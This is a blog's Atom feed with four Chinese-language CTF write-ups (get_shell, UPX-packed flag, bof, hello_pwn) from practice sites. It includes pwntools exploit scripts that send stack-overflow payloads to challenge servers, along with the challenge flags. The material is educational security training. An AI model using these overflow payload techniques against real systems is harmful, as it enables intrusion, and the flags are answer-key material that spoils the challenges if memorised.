<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xiaoxiaoxy</title>
  
  
  <link href="http://xiaoxiaoxy1.github.io/atom.xml" rel="self"/>
  
  <link href="http://xiaoxiaoxy1.github.io/"/>
  <updated>2021-10-28T04:35:05.490Z</updated>
  <id>http://xiaoxiaoxy1.github.io/</id>
  
  <author>
    <name>xiaoxiaoxy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>get_shell</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/10/28/get-shell/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/10/28/get-shell/</id>
    <published>2021-10-28T04:28:45.000Z</published>
    <updated>2021-10-28T04:35:05.490Z</updated>
    
    <content type="html"><![CDATA[<p>首先，我们看到题目：</p><p><img src="image-20211028122944618.png" alt="image-20211028122944618"></p><p>下载附件&amp;获取场景：</p><p><img src="image-20211028122959729.png" alt="image-20211028122959729"></p><p>因为题目中说运行即可拿到shell，那我们就直接进虚拟机连接到该ip去看看</p><p>发现nc指令连不上去，之前用ssh也连不上，根本没反应,我姐说可能是防火墙的原因 </p><p><img src="image-20211028123019714.png" alt="image-20211028123019714"></p><p>那我们换个思路，写个脚本试试：</p><p><img src="image-20211028123056923.png" alt="image-20211028123056923"></p><p>运行该脚本：</p><p><img src="image-20211028123302612.png" alt="image-20211028123302612"></p><p>$ ls 查看当前目录文件，发现flag，cat一下  $ cat flag 发现能够得到flag，提交即可</p><p>flag：cyberpeace{c2414b5c0583aef5e2d7b2bbd7a98a83}</p><p><strong>拓展：</strong></p><p>但题目说运行即可拿到flag，我们并没有运行本题附件，接下来下载附件运行一下</p><p><img src="image-20211028123403958.png" alt="image-20211028123403958"></p><p>这是我/Desktop目录下的文件：</p><p><img src="image-20211028123422849.png" alt="image-20211028123422849"></p><p>显然，这个附件帮我拿到了我自己电脑的shell，所以我只能查看我自己电脑上的文件</p><p>这时我们打开ida反编译一下附件：</p><p>打开main函数后可以发现，这里直接调用了system（）函数获取shell</p><p><img src="image-20211028123450549.png" alt="image-20211028123450549"></p><p><strong>综述：</strong></p><p>本地执行本题附件只会拿到当前机器的shell，而该题的flag存在远端服务器上，并未存储在我们的个人PC上，所以我们要连接到远端服务器上，去服务器上执行该文件才能在服务器上拿到该题的flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*                          <span class="comment">#导入pwn模块</span></span><br><span class="line">p = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;63031&#x27;</span>)     <span class="comment">#远程连接</span></span><br><span class="line">p.interactive()                           <span class="comment">#接收服务器的交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：cyberpeace&#123;c2414b5c0583aef5e2d7b2bbd7a98a83&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">攻防世界-get_shell</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>flag</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/10/28/flag/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/10/28/flag/</id>
    <published>2021-10-28T04:17:24.000Z</published>
    <updated>2021-10-28T04:22:41.504Z</updated>
    
    <content type="html"><![CDATA[<p><strong>1：</strong>拿到题目，借助网址下载相应文件<strong>1：</strong>拿到题目，借助网址下载相应文件</p><p><img src="image-20211028121819871.png" alt="image-20211028121819871"></p><p><img src="image-20211028121841578.png" alt="image-20211028121841578"></p><p>命令1：wget <a href="http://pwnable.kr/bin/flag">http://pwnable.kr/bin/flag</a></p><p><strong>2：</strong>通过网络资料知：</p><p>  “用个16进制查看器看一下,是elf文件,并且加了upx壳,要脱下upx壳才好分析”</p><p><img src="image-20211028121911536.png" alt="image-20211028121911536"></p><p>这16进制查看器我不知道咋弄的，该图也是从网上搬来的。</p><p><strong>3：</strong>由于upx不为自带文件，需自行下载，相应Linux指令附着于下：</p><p>（1）：下载upx：命令2：</p><p>wget <a href="https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz">https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz</a></p><p>（2）：解压二进制：命令3：</p><p>tar -Jxf upx*.tar.xz</p><p>（3）：为了方便使用移动 upx 到系统变量目录，如果不愿意使用 root 的话可以将 upx 目录添加到环境变量：命令4：</p><p>sudo cp upx*/upx /usr/bin</p><p><strong>4：</strong>利用upx 进行解压，upx -d filename：</p><p><img src="image-20211028121940998.png" alt="image-20211028121940998"></p><p>基本操作不做过多赘述，实在不理解请自行百度查找（其实我也不理解，会用就行）</p><p>命令6：upx -d flag</p><p>5：查看文件是否下载至当前路径（我的当前路径为Desktop（桌面））：</p><p><img src="image-20211028122002870.png" alt="image-20211028122002870"></p><p>此处进行了权限赋予操作（赘余操作，可不必进行）</p><p>命令7：chmod 777 flag</p><p><strong>6：</strong>运用file命令查看flag文件的位数情况（32位 or 64位）：</p><p><img src="image-20211028122020834.png" alt="image-20211028122020834"></p><p>命令8：file flag</p><p>由此得知flag文件为64位文件</p><p><strong>7：</strong>现在只需将flag文件拖动至Windows界面中的64位ida中进行反编译即可，具体操作在此不做赘述（拖动文件会吧？不用教了吧，拖不出来的话考虑换一个虚拟机吧）</p><p><strong>8：</strong>接下来就是常规操作，按下ok，找到main函数按下F5，结果如下：</p><p><img src="image-20211028122043880.png" alt="image-20211028122043880"></p><p><strong>9：</strong>分析main函数，并无特别之处，但那flag格外显眼，经合情推理，flag内置于内存之中，这时我们只需双击flag便可进入如下界面，并发现flag地址处存储的一组字符串：</p><p><img src="image-20211028122118485.png" alt="image-20211028122118485"></p><p>UPX…? sounds like a delivery service但这并不是flag</p><p>10：双击字符串后进入另一界面，此时flag便出现了：</p><p><img src="image-20211028122203449.png" alt="image-20211028122203449"></p><p>正解flag：UPX…? sounds like a delivery service :)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：UPX...? sounds like a delivery service :)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">pwnable-flag</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>bof</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/10/28/bof/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/10/28/bof/</id>
    <published>2021-10-28T03:47:34.000Z</published>
    <updated>2021-10-28T04:14:18.074Z</updated>
    
    <content type="html"><![CDATA[<p>1：先看题目</p><p><img src="clip_image002.jpg" alt="clip_image002"></p><p>Windows:将地址复制粘贴至浏览器即可下载</p><p>Linux：开启root权限，使用wget指令即可下载本题文件</p><p>  $ wget <a href="http://pwnable.kr/bin/bof">http://pwnable.kr/bin/bof</a></p><p>  $ wget <a href="http://pwnable.kr/bin/bof.c">http://pwnable.kr/bin/bof.c</a></p><p>2：Linux下使用file指令查看bof文件信息</p><p><img src="clip_image003.png" alt="clip_image003"></p><p>32-bit可知bof文件为32位文件</p><p>3：打开32位ida，将bof二进制可执行文件拖入其中</p><p>进行一些基本操作可得到如下结果，如图</p><p>图一：main函数</p><p>图二：func函数</p><p><img src="clip_image005.jpg" alt="clip_image005"></p><p><img src="C:\blog\source_posts\bof.assets\clip_image006.png" alt="img"></p><p>简要分析可知：在远端服务器执行该文件，并且当a1的值为-889275714时，即可拿到远端服务器的shell，进而得到你想要的flag，to win</p><p>5：</p><p><img src="clip_image007.png" alt="clip_image007"></p><p>Gdb打开bof文件</p><p><img src="clip_image008.png" alt="clip_image008"></p><p>在main函数处设置断点并执行文件</p><p><img src="clip_image009.png" alt="clip_image009"></p><p><img src="clip_image011.jpg" alt="clip_image011"></p><p><img src="clip_image013.jpg" alt="clip_image013"></p><p>在idamain函数中使用Hex…我们发现这两个数据相同，自己领会</p><p><img src="clip_image014.png" alt="clip_image014"></p><p>刚运行至我们设置的断点处，指针停在了这个位置</p><p><img src="clip_image015.png" alt="clip_image015"></p><p>离我们的func函数仅有三步之遥</p><p><img src="clip_image016.png" alt="clip_image016"></p><p>此时我们执行四次si指令即可进入func函数，结果如下</p><p><img src="clip_image017.png" alt="clip_image017"></p><p>查看栈段：</p><p><img src="clip_image019.jpg" alt="clip_image019"></p><p>得到内存的栈段中func函数的末尾地址0xffffd130</p><p>利用x/50wx 0xffffd130，从栈地址0xffffd130向高位打印50个内存地址（一个地址四字节）</p><p><img src="clip_image021.jpg" alt="clip_image021"></p><p>结果如上图，第一个0x61616161便是我们输入的数组s的初始值（即s[0]），0xdeadbeef即为我们main函数中的传入func的参数，因此我们只需要输入80-4c = 34（转换为十进制即为52），输入52个任意字符外加目标字符“0xCAFEBABE”即可解决此题</p><p>构造的脚本如下：</p><p><img src="clip_image022.png" alt="clip_image022"></p><p>结果如下：</p><p><img src="clip_image023.png" alt="clip_image023"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*                          <span class="comment">#导入pwn模块</span></span><br><span class="line">p = remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)             <span class="comment">#连接远端服务器</span></span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span>*(<span class="number">0x34</span>) + p32(<span class="number">0xcafebabe</span>))  <span class="comment">#发送payload</span></span><br><span class="line">p.interactive()                           <span class="comment">#接收远端服务器交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">pwnable-bof</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>攻防世界-hello_pwn</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/10/27/Note/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/10/27/Note/</id>
    <published>2021-10-27T13:56:07.000Z</published>
    <updated>2021-10-27T15:03:12.617Z</updated>
    
    <content type="html"><![CDATA[<p>首先，我们看到题目：</p><p><img src="image-20211027220220140.png" alt="image-20211027220220140"></p><p>下载附件，ida反编译并找出主函数：</p><p><img src="image-20211027224506556.png" alt="image-20211027224506556"></p><p>看到read函数，初步判断是栈溢出题</p><p>进入sub函数查看：</p><p><img src="image-20211027224643668.png" alt="image-20211027224643668"></p><p>ok，解题思路：只要能连接上服务器，并执行该文件，在与服务器交互中，输入一串payload使程序中的dword_60106C值变为1853186401后进入sub函数我们就能拿到服务器上的flag。</p><p>好的，先让我们阅读一下read（）函数，点进read（）函数中的unk_601068变量</p><p><img src="image-20211027224714446.png" alt="image-20211027224714446"></p><p>对比一下：</p><p><img src="image-20211027224732285.png" alt="image-20211027224732285"></p><p>发现这两个变量的偏移量为6C-68 = 4（16进制）</p><p>因此我们可以构造payload = ‘aaaa’+p64(1853186401)，具体脚本如下：</p><p><img src="image-20211027224758038.png" alt="image-20211027224758038"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&#x27;63031&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;lets get helloworld for bof&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python gfsj1.py</span><br><span class="line">[+] Opening connection to 111.200.241.244 on port 54083: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">cyberpeace&#123;6a5a35ff4fd3d526fbb7a7263ec67500&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Closed connection to 111.200.241.244 port 54083</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">攻防世界-hello_pwn</summary>
    
    
    
    
  </entry>
  
</feed>
